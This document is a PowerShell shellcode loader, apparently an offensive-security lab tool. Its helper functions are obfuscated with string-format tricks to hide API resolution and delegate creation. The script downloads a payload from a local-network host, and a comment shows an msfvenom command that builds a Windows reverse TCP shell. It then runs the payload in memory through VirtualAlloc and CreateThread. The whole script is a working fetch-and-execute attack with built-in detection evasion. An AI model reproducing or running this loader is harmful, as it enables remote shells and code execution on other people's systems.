$EhM  = [type]("{0}{1}"-f'aPPdOmAi','n')  ;function P`OTAT`oEs {
Param (${C`h`eRR`iEs}, ${p`i`NeA`PPLE})
${TOm`AToES} = (  (Ls  ('VAr'+'I'+'A'+'BlE:ehm') ).vAlue::"c`Ur`R`ENtDOMAIN".("{4}{1}{3}{0}{2}"-f 'lie','m','s','b','GetAsse').Invoke() | .("{3}{1}{2}{0}" -f 'ect','e-O','bj','Wher') { ${_}."gLO`BAla`S`SEmblyca`CHe" -And ${_}."L`OCaT`ioN".("{1}{0}"-f 't','Spli').Invoke('\\')[-1].("{0}{1}" -f 'E','quals').Invoke(("{0}{1}{2}" -f 'Sys','tem','.dll')) }).("{1}{0}"-f'etType','G').Invoke(("{7}{8}{1}{3}{2}{6}{4}{5}{0}" -f 's','crosof','2.Unsa','t.Win3','ativeMe','thod','feN','M','i'))
${tU`Rn`IPs}=@()
${tOM`AToES}.("{0}{1}{2}"-f'GetMet','ho','ds').Invoke() | &("{0}{3}{4}{2}{1}" -f 'F','bject','O','orEach','-') {If(${_}."n`Ame" -eq ("{1}{0}{3}{2}"-f 'tProcAdd','Ge','ess','r')) {${T`UrN`IPS}+=${_}}}
return ${t`URNiPS}[0]."in`Voke"(${nu`Ll}, @((${t`OmAt`Oes}.("{1}{0}{2}" -f'Met','Get','hod').Invoke(("{0}{1}{2}{3}{4}" -f 'GetMod','ule','Hand','l','e')))."I`NVoKE"(${NU`ll}, @(${ch`E`Rr`IES})), ${PINeA`pp`le}))
}

.('Sv')  ("o0"+"D") (  [tYpe]("{2}{1}{0}" -F 'OMAiN','D','apP'));  &("{1}{0}" -f 'M','SeT-iTE')  ("{3}{1}{0}{2}"-f 'RIAb','A','lE:8vkCM1','V') (  [tYpe]("{0}{1}{4}{6}{5}{7}{2}{8}{9}{3}{10}" -f'SySTe','M.reFl','SSE','BuiLD','e','ION.eM','Ct','iT.A','mb','Ly','ERACcess')  )  ;    &("{1}{2}{0}"-f'M','SEt-it','E')  ("{0}{3}{2}{1}" -f 'vaRi','x2',':5','aBLe')  ([TyPe]("{7}{6}{5}{1}{4}{3}{0}{2}"-F'on','cA','S','entI','LLINGConv','ECtioN.','EfL','SYStem.r') ) ;  function APp`lES {
Param (
[Parameter(poSItIon = 0, mandatORy = ${TR`Ue})] [Type[]] ${FU`NC},
[Parameter(PosItIon = 1)] [Type] ${D`ELt`ype} = [Void]
)
${t`YPe} =  (  &("{1}{2}{0}{3}"-f'dI','c','hiL','Tem') ("VARIabl"+"E"+":o0d") ).valUe::"currEntd`O`maIN".("{0}{2}{1}{4}{3}"-f 'Defi','eDynamic','n','embly','Ass').Invoke((.("{0}{1}{2}"-f'New-','Ob','ject') ("{7}{1}{0}{4}{2}{3}{6}{5}" -f'e','.R','lecti','on.Assemb','f','me','lyNa','System')(("{2}{1}{3}{0}" -f 'e','eflected','R','Delegat'))),  (.("{2}{0}{1}" -f't-','vArIaBle','GE') ("{1}{0}" -f '1','8vKcm')  -VAlUE)::"R`Un").("{3}{0}{2}{1}" -f'eDynamicMo','ule','d','Defin').Invoke(("{1}{0}{2}{3}" -f'nMemo','I','ryM','odule'), ${fAl`sE}).("{0}{1}{2}" -f'Defi','neTy','pe').Invoke(("{1}{2}{0}"-f'e','MyDelegat','eTyp'), ("{4}{9}{1}{2}{5}{10}{3}{11}{7}{0}{6}{8}"-f' Au','Public, ','Sea',' A','Cla','le','toCla','Class,','ss','ss, ','d,','nsi'),[System.MulticastDelegate])
${TY`PE}.("{4}{3}{2}{0}{1}" -f'Construct','or','e','in','Def').Invoke(("{9}{7}{8}{2}{0}{6}{1}{4}{3}{5}"-f 'H','Pu',', ','l','b','ic','ideBySig, ','ci','alName','RTSpe'),  $5X2::"ST`An`Dard", ${FU`Nc}).("{1}{0}{4}{3}{2}" -f'leme','SetImp','lags','ionF','ntat').Invoke(("{3}{0}{4}{1}{2}"-f ', M','nag','ed','Runtime','a'))
${ty`Pe}.("{0}{1}{2}"-f 'De','f','ineMethod').Invoke('Invoke', ("{0}{10}{6}{5}{3}{7}{2}{1}{8}{4}{9}"-f 'Pub','lo','S','ySig, N','Vi','deB',' Hi','ew','t, ','rtual','lic,'), ${DELT`ype}, ${Fu`NC}).("{5}{4}{1}{0}{2}{3}{6}"-f 'i','Implementat','o','nFlag','t','Se','s').Invoke(("{1}{2}{0}{3}" -f 'time','Ru','n',', Managed'))
return ${ty`Pe}.("{1}{2}{0}{3}" -f 'ea','C','r','teType').Invoke()
}

# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.235.130 LPORT=443 -f raw > rev.bin
$url = "http://192.168.45.1:80/rev.bin"
[Byte[]] $buf = [System.Net.WebClient]::new().DownloadData($url)

$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
$parsnips =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)
